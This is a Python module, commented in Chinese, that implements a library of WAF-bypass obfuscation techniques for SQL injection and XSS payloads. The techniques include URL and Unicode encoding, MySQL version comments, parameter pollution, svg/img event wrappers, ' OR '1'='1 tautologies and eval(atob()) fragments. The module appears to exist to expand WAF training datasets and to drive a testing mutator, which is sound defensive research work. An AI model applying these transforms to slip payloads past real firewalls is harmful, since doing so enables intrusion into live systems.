"""
WAF 混淆绕过技术库（Obfuscation Techniques）
==============================================
基于文献与实战常用手法（ModSec-AdvLearn、WAF-A-MoLE、WAFFLED、DEG-WAF）：
  - 编码链：URL 单/双编码、Unicode、Hex、HTML 实体、Base64
  - 结构变换：内联注释、MySQL 版本注释、空白符替换、关键字拆分
  - XSS 专用：事件处理器、SVG、部分 HTML 实体
  - SQLi 专用：CHAR()、CONCAT 拆分、科学计数法、括号过载

供 dataset_agent 大规模扩充与 mutator 实战变异共用。
"""

from __future__ import annotations

import base64
import random
import re
from urllib.parse import quote

# 技术名称 → 适用攻击类型（空集表示通用）
TECHNIQUES: dict[str, set[str]] = {
    "case_random": set(),
    "inline_comment": {"SQLi", "XSS"},
    "mysql_version_comment": {"SQLi"},
    "url_encode": set(),
    "double_url_encode": set(),
    "unicode_escape": set(),
    "hex_escape": {"SQLi"},
    "whitespace_substitution": {"SQLi"},
    "null_byte": set(),
    "html_entity_partial": {"XSS"},
    "html_entity_full": {"XSS"},
    "base64_fragment": set(),
    "keyword_concat_split": {"SQLi"},
    "tab_newline": {"SQLi"},
    "paren_overload": {"SQLi"},
    "char_function": {"SQLi"},
    "svg_event_wrap": {"XSS"},
    "img_onerror_wrap": {"XSS"},
    "logic_or_tautology": {"SQLi"},
    "nested_comment": {"SQLi"},
    # 社区实战新增（FreeBuf / 先知 / WAFFLED 类）
    "hpp_duplicate_param": {"SQLi", "XSS"},
    "json_nested_escape": {"SQLi", "XSS"},
    "unicode_normalization": set(),
    "multipart_boundary_sim": set(),
    "chunked_whitespace": {"SQLi"},
}


def apply_technique(payload: str, technique: str, rng: random.Random | None = None) -> str:
    """对单条载荷应用指定混淆技术。"""
    r = rng or random.Random()
    fn = _DISPATCH.get(technique)
    if fn is None:
        return payload
    try:
        return fn(payload, r)
    except Exception:
        return payload


def expand_payload(
    payload: str,
    attack_type: str,
    n: int = 5,
    seed: int | None = None,
) -> list[dict[str, str]]:
    """
    对单条攻击载荷生成 n 个混淆变体。

    Returns:
        [{"payload": ..., "label": ..., "source": "obfuscation:tech_name"}, ...]
    """
    rng = random.Random(seed)
    applicable = [
        t for t, types in TECHNIQUES.items()
        if not types or attack_type in types
    ]
    if not applicable:
        applicable = list(TECHNIQUES.keys())

    rng.shuffle(applicable)
    out: list[dict[str, str]] = []
    seen = {payload}

    for tech in applicable:
        if len(out) >= n:
            break
        variant = apply_technique(payload, tech, rng)
        if variant not in seen and variant != payload:
            seen.add(variant)
            out.append({
                "payload": variant[:2048],
                "label": attack_type,
                "source": f"obfuscation:{tech}",
            })

    # 不足时随机叠加两种技术
    attempts = 0
    while len(out) < n and attempts < n * 3:
        attempts += 1
        t1, t2 = rng.sample(applicable, min(2, len(applicable)))
        v = apply_technique(apply_technique(payload, t1, rng), t2, rng)
        if v not in seen:
            seen.add(v)
            out.append({
                "payload": v[:2048],
                "label": attack_type,
                "source": f"obfuscation:{t1}+{t2}",
            })

    return out


def expand_dataset_rows(
    rows: list[dict[str, str]],
    variants_per_attack: int = 3,
    seed: int = 42,
    max_total: int | None = None,
) -> list[dict[str, str]]:
    """
    对数据集中所有非 Normal 样本做混淆扩充，保留原始行。
    """
    rng = random.Random(seed)
    result = list(rows)
    attack_rows = [r for r in rows if r.get("label", "Normal") != "Normal"]
    rng.shuffle(attack_rows)

    for i, row in enumerate(attack_rows):
        if max_total and len(result) >= max_total:
            break
        label = row["label"]
        variants = expand_payload(
            row["payload"], label,
            n=variants_per_attack,
            seed=seed + i,
        )
        result.extend(variants)

    if max_total:
        return result[:max_total]
    return result


# ---------------------------------------------------------------------------
# 各技术实现
# ---------------------------------------------------------------------------

def _case_random(s: str, r: random.Random) -> str:
    return "".join(c.upper() if r.random() > 0.5 else c.lower() for c in s)


def _inline_comment(s: str, r: random.Random) -> str:
    return s.replace(" ", "/**/").replace("=", "/**/=/**/")


def _mysql_version_comment(s: str, r: random.Random) -> str:
    return re.sub(
        r"(?i)(union|select|from|where)",
        lambda m: f"/*!50000{m.group(0)}*/",
        s,
    )


def _url_encode(s: str, r: random.Random) -> str:
    return quote(s, safe="")


def _double_url_encode(s: str, r: random.Random) -> str:
    return quote(quote(s, safe=""), safe="")


def _unicode_escape(s: str, r: random.Random) -> str:
    out = []
    for c in s:
        if c.isalpha() and r.random() > 0.55:
            out.append(f"\\u{ord(c):04x}")
        else:
            out.append(c)
    return "".join(out)


def _hex_escape(s: str, r: random.Random) -> str:
    return re.sub(
        r"(?i)(union|select|or|and)",
        lambda m: "0x" + m.group(0).encode().hex(),
        s,
    )


def _whitespace_substitution(s: str, r: random.Random) -> str:
    ws = [ "%09", "%0a", "%0d", "/**/", "+"]
    return s.replace(" ", r.choice(ws))


def _null_byte(s: str, r: random.Random) -> str:
    pos = r.randint(0, max(len(s) - 1, 0))
    return s[:pos] + "%00" + s[pos:]


def _html_entity_partial(s: str, r: random.Random) -> str:
    return "".join(f"&#{ord(c)};" if c.isalnum() and r.random() > 0.5 else c for c in s)


def _html_entity_full(s: str, r: random.Random) -> str:
    return "".join(f"&#{ord(c)};" for c in s)


def _base64_fragment(s: str, r: random.Random) -> str:
    frag = s[: min(40, len(s))]
    b64 = base64.b64encode(frag.encode()).decode()
    return f"eval(atob('{b64}'))" + s[len(frag):]


def _keyword_concat_split(s: str, r: random.Random) -> str:
    return re.sub(
        r"(?i)(union|select|script|alert|or|and)",
        lambda m: "'+'".join(m.group(0)),
        s,
    )


def _tab_newline(s: str, r: random.Random) -> str:
    return s.replace(" ", "\t").replace(",", ",\n")


def _paren_overload(s: str, r: random.Random) -> str:
    return re.sub(r"(?i)(select)", lambda m: "(".join(m.group(0)) + "(", s)


def _char_function(s: str, r: random.Random) -> str:
    if len(s) > 30:
        return s
    chars = ",".join(f"CHAR({ord(c)})" for c in s[:15])
    return f"CONCAT({chars})"


def _svg_event_wrap(s: str, r: random.Random) -> str:
    inner = re.sub(r"<[^>]+>", "", s)
    return f"<svg/onload={inner}>"


def _img_onerror_wrap(s: str, r: random.Random) -> str:
    inner = s.replace('"', "'")
    return f'<img src=x onerror="{inner}">'


def _logic_or_tautology(s: str, r: random.Random) -> str:
    if "or" in s.lower():
        return s
    return s + "' OR '1'='1"


def _nested_comment(s: str, r: random.Random) -> str:
    return s.replace(" ", "/*/*/") + "/*--*/"


def _hpp_duplicate_param(s: str, r: random.Random) -> str:
    """HPP 参数污染：重复参数名，后端取末值而 WAF 取首值（社区常见）。"""
    return f"id=1&id={s}"


def _json_nested_escape(s: str, r: random.Random) -> str:
    """JSON 嵌套键逃逸 Content-Type 解析差异。"""
    esc = s.replace('"', '\\"')
    return f'{{"a":{{"b":"{esc}"}}}}'


def _unicode_normalization(s: str, r: random.Random) -> str:
    """Unicode 规范化绕过：全角/兼容字符替换 ASCII。"""
    table = str.maketrans({
        "u": "\uff55", "n": "\uff4e", "i": "\uff49", "o": "\uff4f",
        "s": "\uff53", "e": "\uff45", "l": "\uff4c", "t": "\uff54",
        "a": "\uff41", "r": "\uff52",
    })
    out = []
    for c in s:
        if c.lower() in "unionselect" and r.random() > 0.4:
            out.append(c.translate(table))
        else:
            out.append(c)
    return "".join(out)


def _multipart_boundary_sim(s: str, r: random.Random) -> str:
    """模拟 multipart 边界混淆（字符级，供 normalizer 测试）。"""
    bnd = r.randint(10000, 99999)
    return (
        f"--WebKitFormBoundary{bnd}\r\n"
        f'Content-Disposition: form-data; name="q"\r\n\r\n{s}\r\n'
        f"--WebKitFormBoundary{bnd}--"
    )


def _chunked_whitespace(s: str, r: random.Random) -> str:
    """分块传输思路的空白符变体（%0d%0a 注入到关键字间）。"""
    return re.sub(
        r"(?i)(union|select|from|where)",
        lambda m: m.group(0)[0] + "%0d%0a" + m.group(0)[1:],
        s,
    )


_DISPATCH: dict[str, object] = {
    "case_random": _case_random,
    "inline_comment": _inline_comment,
    "mysql_version_comment": _mysql_version_comment,
    "url_encode": _url_encode,
    "double_url_encode": _double_url_encode,
    "unicode_escape": _unicode_escape,
    "hex_escape": _hex_escape,
    "whitespace_substitution": _whitespace_substitution,
    "null_byte": _null_byte,
    "html_entity_partial": _html_entity_partial,
    "html_entity_full": _html_entity_full,
    "base64_fragment": _base64_fragment,
    "keyword_concat_split": _keyword_concat_split,
    "tab_newline": _tab_newline,
    "paren_overload": _paren_overload,
    "char_function": _char_function,
    "svg_event_wrap": _svg_event_wrap,
    "img_onerror_wrap": _img_onerror_wrap,
    "logic_or_tautology": _logic_or_tautology,
    "nested_comment": _nested_comment,
    "hpp_duplicate_param": _hpp_duplicate_param,
    "json_nested_escape": _json_nested_escape,
    "unicode_normalization": _unicode_normalization,
    "multipart_boundary_sim": _multipart_boundary_sim,
    "chunked_whitespace": _chunked_whitespace,
}
